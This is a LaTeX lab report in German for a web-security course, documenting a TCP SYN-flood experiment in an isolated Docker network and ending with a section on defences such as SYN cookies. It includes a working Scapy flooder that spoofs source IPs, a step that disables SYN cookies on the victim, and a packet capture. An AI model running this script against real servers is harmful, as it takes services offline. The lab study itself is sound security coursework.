\documentclass[
	fontsize=12pt,
	paper=a4,
	numbers=noenddot,
	listof=totoc,
	listof=entryprefix,
	listof=nochaptergap,
	bibliography=totoc,
	parskip=half,
	openany
]{scrbook}

\usepackage{cmap}


\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{ngerman}


\usepackage{scrhack}
\usepackage[table]{xcolor}
\usepackage{chngcntr}
\usepackage{enumitem}


\usepackage{amsthm}


\usepackage{lipsum}
\usepackage{unicode-math}


\usepackage{mathtools}


\usepackage[
	colorlinks=false,
	linkcolor=black,
	citecolor=black,
	filecolor=black,
	urlcolor=black,
	bookmarks=true,
	bookmarksopen=true,
	bookmarksopenlevel=3,
	bookmarksnumbered,
	plainpages=false,
	pdfpagelabels=true,
	hyperfootnotes
]{hyperref}


\renewcommand{\familydefault}{\sfdefault}
\usepackage[onehalfspacing]{setspace}
\raggedbottom

\usepackage{anyfontsize}

\addtokomafont{chapter}{\sffamily\large\bfseries}
\addtokomafont{section}{\sffamily\normalsize\bfseries}
\addtokomafont{subsection}{\sffamily\normalsize\mdseries}
\addtokomafont{caption}{\sffamily\normalsize\mdseries}

\usepackage{relsize}
\renewcommand*{\UrlFont}{\ttfamily\smaller\relax}


\usepackage[
	bindingoffset=0cm,
	inner=2.5cm,
	outer=2.5cm,
	top=3cm,
	bottom=2cm
]{geometry}

\usepackage[
	headsepline,
	plainheadsepline
]{scrlayer-scrpage}
\clearpairofpagestyles
\addtokomafont{pagehead}{\normalfont}
\ohead*{\thepage}
\ihead*{\leftmark}


\usepackage{graphicx}
\graphicspath{{pictures/}}
\usepackage{float}

\renewcommand{\thefigure}{\arabic{figure}}
\counterwithout{figure}{chapter}

\usepackage{wrapfig}


\usepackage{booktabs}
\usepackage{multirow}
\usepackage{tabularx}

\renewcommand{\thetable}{\arabic{table}}
\counterwithout{table}{chapter}


\usepackage{listings}
\usepackage{beramono}

\renewcommand{\lstlistlistingname}{List of Code Listings}
\renewcommand{\lstlistingname}{Code Listing}
\newcommand{\listoflolentryname}{\lstlistingname}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.5,0,0.33}
\definecolor{codepurblue}{rgb}{0.16,0.0,1.0}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{codestyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	keywordstyle=\bfseries\color{codepurple},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurblue},
	basicstyle=\scriptsize\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	numbersep=5pt,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	escapeinside={(*@}{@*)}
}
\lstset{style=codestyle, numberbychapter=false}



\KOMAoptions{toc=chapterentrydotfill}
\addtokomafont{chapterentry}{\normalfont}
\setuptoc{toc}{totoc}

\DeclareTOCStyleEntry[beforeskip=0cm]{chapter}{chapter}
\DeclareTOCStyleEntry[beforeskip=0cm]{section}{section}
\DeclareTOCStyleEntry[beforeskip=0cm]{default}{subsection}

\BeforeStartingTOC[lof]{\def\autodot{:}}
\BeforeStartingTOC[lot]{\def\autodot{:}}
\BeforeStartingTOC[lol]{\def\autodot{:}}


\iffalse
\usepackage{csquotes}
\setlength\bibitemsep{.5\baselineskip}
\setcounter{biburlnumpenalty}{9000}
\setcounter{biburllcpenalty}{9000}
\setcounter{biburlucpenalty}{9000}

\fi

\usepackage[printonlyused]{acronym}


\usepackage[title,titletoc]{appendix}

\newcommand{\appendixchapter}[1]{
\cleardoublepage
\pagenumbering{arabic}
\renewcommand{\thepage}{\thechapter-\arabic{page}}
\chapter{#1}
}

\newcommand{\monthlyreport}[2]{
\section{#1}
\centering
\includegraphics[trim=55 35 55 35,clip,width=1\textwidth]{#2}
\clearpage
}



\newtheorem{beispiel}{Beispiel}

\newtheorem{these}{These}

\newtheorem{definition}{Definition}


\usepackage[nameinlink, noabbrev]{cleveref}


\lstset{
	extendedchars=true,
	inputencoding=utf8,
	literate=
		{ä}{{\"a}}1
		{ö}{{\"o}}1
		{ü}{{\"u}}1
		{ß}{{\ss}}1
		{Ä}{{\"A}}1
		{Ö}{{\"O}}1
		{Ü}{{\"U}}1
}

\begin{document}

\begin{titlepage}
	\pagestyle{empty}

	\begin{flushright}
		\begin{figure}[ht]
			\flushright
			\includegraphics[height=2cm]{../../for_latex/hfu}
		\end{figure}
	\end{flushright}

	\begin{center}
		\vspace{3cm}

		{\fontsize{22}{22} \selectfont \textbf{Blatt 1}}\\[5mm]
		{\fontsize{18}{18} \selectfont Web-Security und Intrusion Prevention}

		\vspace{12cm}

		{\fontsize{14}{14} \selectfont Luis Staudt}
	\end{center}
\end{titlepage}


\chapter*{Aufgabe 1: TCP-SYN-Flooding}

\section*{Aufbau des Versuchs}

Der Angriff wurde in einer vollständig isolierten Umgebung gegen einen eigenen
Testserver durchgeführt, nicht gegen fremde Systeme. Anstelle zweier virtueller
Maschinen kamen zwei Container in einem \texttt{internal}-Docker-Netz zum
Einsatz, das keine Verbindung nach aussen besitzt. Als Opfer diente ein
minimaler Webserver (\texttt{python -m http.server 80}), der die vorgegebene
\texttt{index.html} ausliefert. Der Angreifer lief in einem Container mit Scapy
und tcpdump. Die \texttt{NET\_RAW}-Capability ist dabei erforderlich, da das
Versenden roher Pakete Root-Rechte auf Socket-Ebene voraussetzt.

Vor dem Angriff werden auf dem Opfer die SYN-Cookies deaktiviert, da der Kernel
die halboffenen Verbindungen andernfalls nicht in einer begrenzten Queue
vorhält:

\begin{lstlisting}[language=bash]
sudo sysctl -w net.ipv4.tcp_syncookies=0
\end{lstlisting}

\section*{Funktionsweise des Angriffs}

Der TCP-Verbindungsaufbau ist ein Drei-Wege-Handshake. Der Client sendet
\texttt{SYN}, der Server antwortet mit \texttt{SYN/ACK} und legt die halboffene
Verbindung in seiner Backlog-Queue ab, der Client bestätigt mit \texttt{ACK}.

Beim SYN-Flooding sendet der Angreifer sehr viele \texttt{SYN}-Pakete mit
zufälliger, gefälschter Quell-IP. Der Server antwortet jeweils mit
\texttt{SYN/ACK} an die gespoofte Adresse und wartet auf das \texttt{ACK}, das
nie eintrifft. Jede dieser halboffenen Verbindungen belegt bis zum Timeout einen
Platz in der Backlog-Queue. Ist die Queue voll, lehnt der Server neue und auch
legitime Verbindungen ab, sodass der Dienst nicht mehr erreichbar ist.

Die zufällige Quell-IP verhindert das Antwort-\texttt{ACK} und verschleiert
zugleich den Angreifer.

\section*{Das Scapy-Skript}

\begin{lstlisting}[language=Python]
import argparse, random
from scapy.all import IP, TCP, send

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-c", "--count", type=int, default=1000)
    args = ap.parse_args()
    for _ in range(args.count):
        pkt = IP(src=random_ip(), dst=args.target) / \
              TCP(sport=random.randint(1024, 65535), dport=args.port, flags="S")
        send(pkt, verbose=0)

if __name__ == "__main__":
    main()
\end{lstlisting}

Das Flag \verb|flags="S"| setzt das SYN-Bit. Die Quelladresse wird über
\texttt{IP(src=...)} pro Paket gefälscht, der Quell-Port wird zufällig gewählt.

\section*{Durchführung und Mitschnitt}

Der Angriff wurde auf 800 Pakete begrenzt. Diese Anzahl genügt, um das
Angriffsmuster im Mitschnitt zu belegen, ohne den Dienst tatsächlich
lahmzulegen. Parallel lief tcpdump und filterte auf SYN-Pakete zum Port 80:

\begin{lstlisting}[language=bash]
tcpdump -i eth0 -n 'tcp[tcpflags] & tcp-syn != 0 and dst port 80' -w syn.pcap &
python syn_flood.py 172.20.0.2 -p 80 -c 800
\end{lstlisting}

Der Mitschnitt belegt den Angriff: eine Folge von \texttt{SYN}-Paketen
(\texttt{Flags [S]}) von ständig wechselnden, gefälschten Quell-IPs an das Opfer
\texttt{172.20.0.2:80}.

\begin{lstlisting}[language=bash]
09:55:10.545916 IP 156.31.193.62.22665  > 172.20.0.2.80: Flags [S], seq 0
09:55:10.571039 IP 55.1.180.13.25662    > 172.20.0.2.80: Flags [S], seq 0
09:55:10.583164 IP 211.182.186.75.40134 > 172.20.0.2.80: Flags [S], seq 0
09:55:10.595030 IP 113.37.126.215.22853 > 172.20.0.2.80: Flags [S], seq 0
09:55:10.607081 IP 9.41.98.78.19871     > 172.20.0.2.80: Flags [S], seq 0
09:55:10.619006 IP 207.91.156.32.34708  > 172.20.0.2.80: Flags [S], seq 0
09:55:10.636367 IP 160.81.235.108.43512 > 172.20.0.2.80: Flags [S], seq 0
09:55:10.655004 IP 253.203.93.254.21877 > 172.20.0.2.80: Flags [S], seq 0
\end{lstlisting}

Der vollständige Mitschnitt liegt als \texttt{images/syn\_flood.pcap} bei und
lässt sich in Wireshark öffnen. Als Anzeigefilter dient dort
\texttt{tcp.flags.syn == 1 \&\& tcp.flags.ack == 0}, der genau die
Angriffspakete markiert.

\section*{Verteidigung: SYN-Cookies}

Die wirksamste Gegenmassnahme sind SYN-Cookies, die auf aktuellen Linux-Systemen
standardmässig aktiv sind:

\begin{lstlisting}[language=bash]
sudo sysctl -w net.ipv4.tcp_syncookies=1
\end{lstlisting}

Der Server legt beim Eingang eines \texttt{SYN} keinen Zustand mehr in der
Backlog-Queue an. Stattdessen kodiert er die nötigen Informationen
kryptografisch in die Initial Sequence Number des \texttt{SYN/ACK}, das
sogenannte Cookie. Die Verbindung wird erst aufgebaut, sobald ein gültiges
\texttt{ACK} mit passendem Cookie zurückkommt. Da ohne Zustand keine Queue
volllaufen kann, läuft der SYN-Flood ins Leere.

Weitere Massnahmen ergänzen diesen Schutz:

\begin{itemize}
	\item Rate-Limiting pro Quell-IP, das bei gespooften Adressen allerdings nur
	      begrenzt greift.
	\item Vergrössern der Backlog-Queue und Verkürzen des Timeouts für
	      halboffene Verbindungen.
	\item Firewalls und Upstream-Filter beim Provider.
	\item Ingress-Filtering (BCP\,38), das gespoofte Quell-IPs am Netzrand
	      verwirft.
\end{itemize}


\end{document}
